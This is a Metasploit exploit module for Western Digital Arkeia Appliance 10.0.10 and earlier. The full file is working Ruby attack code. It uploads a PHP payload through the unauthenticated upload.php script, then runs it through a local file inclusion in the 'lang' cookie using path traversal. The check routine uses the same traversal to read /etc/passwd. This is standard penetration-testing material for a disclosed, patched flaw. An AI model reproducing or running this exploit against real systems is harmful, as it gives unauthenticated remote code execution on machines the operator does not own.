##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Western Digital Arkeia Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in Western Digital Arkeia Appliance
        version 10.0.10 and lower. By abusing the upload.php file from the scripts directory,
        a malicious user can upload arbitrary code to the ApplianceUpdate file in
        the tmp directory without any authentication. Abusing the local file inclusion in
        the lang cookie to parse this file, results in arbitrary code execution, also without
        any authentication. The module has been tested successfully on Arkeia 10.0.10.
        The issues have been fixed in version 10.1.10.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
         'xistence <xistence[at]0x90.nl>' # Discovery, Metasploit module
        ],
      'References'     =>
        [
          ['URL', 'ftp://ftp.arkeia.com/arkeia-virtual-appliance/vmware-virtual-appliance/full-virtual-appliance/arkeia_virtual_appliance-10.0.10.zip']
        ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
      [
        ['Western Digital Arkeia Appliance 10.0.10', {}]
      ],
      'Privileged'     => false,
      'DisclosureDate' => "Sep 16 2013",
      'DefaultTarget'  => 0))

    register_options(
      [
       OptString.new('TARGETURI', [true, 'The base path to the Arkeia Appliance', '/'])
      ], self.class)
  end

  def check
   uri = target_uri.path
   peer = "#{rhost}:#{rport}"

   # Check version
   print_status("#{peer} - Trying to detect installed version")

   res = send_request_cgi({
     'method' => 'GET',
     'uri'    => normalize_uri(uri, "")
   })

  if res and res.code == 200 and res.body =~ /v(\d+\.\d+\.\d+)/
    version = $1
  else
    return Exploit::CheckCode::Unknown
  end

  print_status("#{peer} - Version #{version} detected")

  if version > "10.0.10"
    return Exploit::CheckCode::Safe
  end

  # Check for vulnerable component
  print_status("#{peer} - Trying to detect the vulnerable component")

  res = send_request_cgi({
    'method' => 'GET',
    'headers' => { 'Cookie' => "lang=../../../../../../../../../../../../../../../../etc/passwd%00en" },
    'uri'    => normalize_uri(uri, "")
  })

  if res and res.code == 200 and res.body =~ /root:x:0:0:root:/
    return Exploit::CheckCode::Vulnerable
  end

    return Exploit::CheckCode::Safe
  end

  def exploit
    uri = target_uri.path

    peer = "#{rhost}:#{rport}"
    payload_name = rand_text_alpha(rand(10) + 5) + '.php'

    post_data = "--o0oOo0o\r\n"
    post_data << "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n"
    post_data << "2000000000\r\n"
    post_data << "--o0oOo0o\r\n"
    post_data << "Content-Disposition: file; name=\"UPLOAD\"; filename=\"#{payload_name}\"\r\n\r\n"
    post_data << "<?php "
    post_data << payload.encoded
    post_data << " ?>\r\n"
    post_data << "--o0oOo0o\r\n"

    print_status("#{peer} - Sending PHP payload which will be uploaded to hardcoded /tmp/ApplianceUpdate")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "scripts", "upload.php"),
      'ctype'  => 'multipart/form-data; boundary=o0oOo0o',
      'data'   => post_data
    })

    # If the server returns 200 and the body contains our payload name,
    # we assume we uploaded the malicious file successfully
    if not res or res.code != 200
      print_error("#{peer} - File wasn't uploaded, aborting!")
      return
    end

    print_status("#{peer} - Sending LFI payload to execute PHP code in /tmp/ApplianceUpdate")
    res = send_request_cgi({
      'method' => 'GET',
      'headers' => { 'Cookie' => "lang=../../../../../../../../../../../../../../../../tmp/ApplianceUpdate%00en" },
      'uri'    => normalize_uri(uri, "")
    })

    # If we don't get a 200 when we request our malicious payload, we suspect
    # we don't have a shell, either.  Print the status code for debugging purposes.
    if res and res.code != 200
      print_status("#{peer} - Server returned #{res.code.to_s}")
    end

	end

end
